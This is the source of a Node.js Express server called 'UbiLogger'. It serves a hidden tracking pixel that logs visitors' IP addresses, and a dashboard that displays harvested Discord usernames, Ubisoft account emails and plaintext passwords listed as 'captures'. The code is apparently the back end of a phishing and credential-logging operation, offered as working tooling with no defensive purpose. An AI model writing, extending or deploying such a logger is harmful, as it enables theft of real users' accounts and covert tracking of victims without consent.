const express = require('express');
const { getAllCaptures } = require('./database');

const app = express();
const PORT = process.env.PORT || 3000;

// Simple root route to confirm server is running
app.get('/', (req, res) => {
  res.send('UbiLogger Server is running');
});

// IP capture endpoint
app.get('/capture', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  console.log(`[IP CAPTURE] IP: ${ip}`);
  const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
  res.set('Content-Type', 'image/gif');
  res.send(pixel);
});

// Dashboard endpoint
app.get('/dashboard', async (req, res) => {
  const captures = await getAllCaptures();
  
  const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>UbiLink Dashboard</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: Arial; background: #0a0a0a; color: white; padding: 20px; }
            h1 { color: #f97316; margin-bottom: 20px; }
            table { width: 100%; border-collapse: collapse; background: #1a1a1a; }
            th, td { padding: 10px; text-align: left; border-bottom: 1px solid #333; }
            th { background: #2a2a2a; color: #f97316; }
            .password { background: #2a2a2a; padding: 2px 6px; border-radius: 4px; font-family: monospace; }
            .stats { display: flex; gap: 15px; margin-bottom: 20px; }
            .stat-card { background: #1a1a1a; padding: 15px; border-radius: 10px; text-align: center; }
            .stat-number { font-size: 32px; font-weight: bold; color: #f97316; }
        </style>
    </head>
    <body>
        <h1>UbiLink Dashboard</h1>
        <div class="stats">
            <div class="stat-card"><div class="stat-number">${captures.length}</div><div>Total Captures</div></div>
        </div>
        <table>
            <thead>
                <tr><th>Discord User</th><th>Email</th><th>Password</th><th>Platform</th><th>Device</th><th>Time</th></tr>
            </thead>
            <tbody>
                ${captures.map(c => `
                    <tr>
                        <td>${c.discord_username}</td>
                        <td>${c.ubi_email}</td>
                        <td><span class="password">${c.ubi_password}</span></td>
                        <td>${c.platform}</td>
                        <td>${c.device_type || 'Unknown'}</td>
                        <td>${new Date(c.timestamp).toLocaleString()}</td>
                    </tr>
                `).join('')}
            </tbody>
        </table>
    </body>
    </html>
  `;
  
  res.send(html);
});

// Start the server - THIS IS THE KEY PART
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});